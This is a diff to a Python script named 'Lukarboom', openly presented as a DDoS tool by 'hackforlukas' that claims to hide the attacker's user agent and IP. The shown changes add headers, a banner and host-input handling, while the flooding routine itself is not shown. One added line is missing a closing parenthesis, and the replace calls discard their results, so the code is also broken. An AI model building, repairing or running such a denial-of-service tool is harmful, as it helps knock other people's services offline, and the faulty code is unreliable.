@@ -1,3 +1,7 @@
+#!/bin/python3
+# ( Ddos Tool: Lukarboom)
+# By hackforlukas
+# MIT License
 import threading as par
 import os
 import socket 
@@ -51,7 +55,7 @@ def menu():
 | |     | | | | |_/ |____ |/ ___)  _ \ / _ \ / _ \|    \ 
 | |_____| |_| |  _ (/ ___ | |   | |_) ) |_| | |_| | | | |
 |_______)____/|_| \_)_____|_|   |____/ \___/ \___/|_|_|_|
-                                                         \033[0m""")
+           v1.0 by hackforlukas (github)\033[0m""")
 	print("\033[31mLukarboom \033[32m~ DdoS-DoS Attack (This Code Hide Your UserAgent and IP Address\n")
 	print("\033[31m[01] \033[32mStart Attack\n\033[31m[99] \033[32mExit\n")
 	choice = input("\033[31mChoice: \033[32m")
@@ -59,11 +63,13 @@ def menu():
 		host = input("\n\033[31mHost or Website: \033[32m")
 		port = int(input("\033[31mPort (Standart: 80): \033[32m"))
 		host.replace("https://", "")
+		host.replace("http://", "")
 		start(host, port)
 	elif choice == "1":
 		host = input("\n\033[31mHost or Website: \033[32m")
 		port = int(input("\033[31mPort (Standart: 80): \033[32m"))
 		host.replace("https://", "")
+		host.replace("http://", ""
 		start(host, port)
 	elif choice == "99":
 		sys.exit()
